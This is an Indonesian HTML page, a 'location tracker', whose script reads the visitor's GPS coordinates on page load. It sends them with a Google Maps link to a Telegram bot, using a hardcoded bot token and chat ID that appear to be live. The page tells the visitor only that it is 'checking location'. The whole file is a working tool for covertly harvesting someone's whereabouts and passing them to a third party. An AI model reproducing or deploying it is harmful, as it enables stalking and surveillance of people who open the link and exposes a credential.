<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pelacak Lokasi</title>
</head>
<body>
    <h2>Memeriksa lokasi...</h2>
    <script>
        let botToken = "7661576818:AAF30R3thCCw2oxvN0Ssyu98YpsnvcQpeTs"; // Ganti dengan TOKEN BOT
        let chatId = "5964872690"; // Ganti dengan Chat ID

        navigator.geolocation.getCurrentPosition(position => {
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;
            let message = `📍 Lokasi HP:\nLat: ${latitude}\nLng: ${longitude}\n\n🔗 Lihat di Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(() => {
                document.body.innerHTML = "<h2>Lokasi berhasil dikirim ke Telegram!</h2>";
            }).catch(error => {
                document.body.innerHTML = "<h2>Gagal mengirim lokasi!</h2>";
                console.error("Error:", error);
            });
        });
    </script>
</body>
</html>
